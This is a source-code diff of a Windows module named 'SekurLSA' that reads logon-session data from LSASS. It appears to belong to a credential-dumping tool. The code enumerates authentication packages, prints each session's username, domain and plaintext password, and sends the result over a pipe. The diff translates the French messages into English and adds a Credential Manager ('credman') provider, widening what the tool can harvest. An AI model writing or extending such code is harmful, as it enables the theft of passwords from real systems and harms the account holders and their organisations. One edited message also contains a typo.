@@ -14,7 +14,7 @@ vector<pair<PFN_ENUM_BY_LUID, wstring>> GLOB_ALL_Providers;
 __kextdll bool __cdecl getDescription(wstring * maDescription)
 {
 	bool resultat = false;
-	maDescription->assign(L"SekurLSA : librairie de manipulation des données de sécurités dans LSASS");
+	maDescription->assign(L"SekurLSA : library for handling data security in LSASS");
 	
 	if(resultat = mod_system::getVersion(&mod_system::GLOB_Version)) /* Utilisation en tant qu'initialisateur */
 	{
@@ -23,6 +23,7 @@ __kextdll bool __cdecl getDescription(wstring * maDescription)
 		if(GetModuleHandle(L"tspkg")) GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getTsPkgLogonData, wstring(L"tspkg")));
 		if(GetModuleHandle(L"kerberos")) GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getKerberosLogonData, wstring(L"kerberos")));
 		if((mod_system::GLOB_Version.dwBuildNumber >= 8000) && GetModuleHandle(L"livessp")) GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getLiveSSPLogonData, wstring(L"livessp")));
+		GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getCredmanData, wstring(L"credman")));
 	}
 	return resultat;
 }
@@ -64,12 +65,12 @@ void genericCredsToStream(wostringstream * monStream, PKIWI_GENERIC_PRIMARY_CRED
 			*monStream << password;
 		else
 		{
-			wstring userName(mesCreds->UserName.Buffer, mesCreds->UserName.Length / sizeof(wchar_t));
-			wstring domainName(mesCreds->Domaine.Buffer, mesCreds->Domaine.Length / sizeof(wchar_t));
+			wstring userName = mod_text::stringOfSTRING(mesCreds->UserName);
+			wstring domainName = mod_text::stringOfSTRING(mesCreds->Domaine);
 			*monStream <<  endl <<
-					L"\t * Utilisateur  : " << (isTsPkg ? domainName : userName) << endl <<
-					L"\t * Domaine      : " << (isTsPkg ? userName : domainName) << endl <<
-					L"\t * Mot de passe : " << password;
+					L"\t * Username     : " << (isTsPkg ? domainName : userName) << endl <<
+					L"\t * Domain       : " << (isTsPkg ? userName : domainName) << endl <<
+					L"\t * Password     : " << password;
 		}
 	} else *monStream << L"n.t. (LUID KO)";
 }
@@ -108,16 +109,12 @@ bool getLogonData(mod_pipe * monPipe, vector<wstring> * mesArguments, vector<pai
 			{
 				if(sessionData->LogonType != Network)
 				{
-					wstring username(sessionData->UserName.Buffer, sessionData->UserName.Length / sizeof(wchar_t));
-					wstring package(sessionData->AuthenticationPackage.Buffer, sessionData->AuthenticationPackage.Length / sizeof(wchar_t));
-					wstring domain(sessionData->LogonDomain.Buffer, sessionData->LogonDomain.Length / sizeof(wchar_t));
-				
 					wostringstream maPremiereReponse;
 					maPremiereReponse << endl <<
-						L"Authentification Id         : " << sessions[i].HighPart << L";" << sessions[i].LowPart << endl <<
-						L"Package d\'authentification  : " << package << endl <<
-						L"Utilisateur principal       : " << username << endl <<
-						L"Domaine d\'authentification  : " << domain << endl;
+						L"Authentication Id            : " << sessions[i].HighPart << L";" << sessions[i].LowPart << endl <<
+						L"Authentication Package       : " << mod_text::stringOfSTRING(sessionData->AuthenticationPackage) << endl <<
+						L"Primary User                 : " << mod_text::stringOfSTRING(sessionData->UserName) << endl <<
+						L"Domain authentication        : " << mod_text::stringOfSTRING(sessionData->LogonDomain) << endl;
 
 					sendOk = sendTo(monPipe, maPremiereReponse.str());
 
@@ -132,11 +129,11 @@ bool getLogonData(mod_pipe * monPipe, vector<wstring> * mesArguments, vector<pai
 				}
 				LsaFreeReturnBuffer(sessionData);
 			}
-			else sendOk = sendTo(monPipe, L"Erreur : Impossible d\'obtenir les données de session\n");
+			else sendOk = sendTo(monPipe, L"Error : nable to get session data\n");
 		}
 		LsaFreeReturnBuffer(sessions);
 	}
-	else sendOk = sendTo(monPipe, L"Erreur : Impossible d\'énumerer les sessions courantes\n");
+	else sendOk = sendTo(monPipe, L"Error : Unable to enumerate the current sessions\n");
 
 	return sendOk;
 }
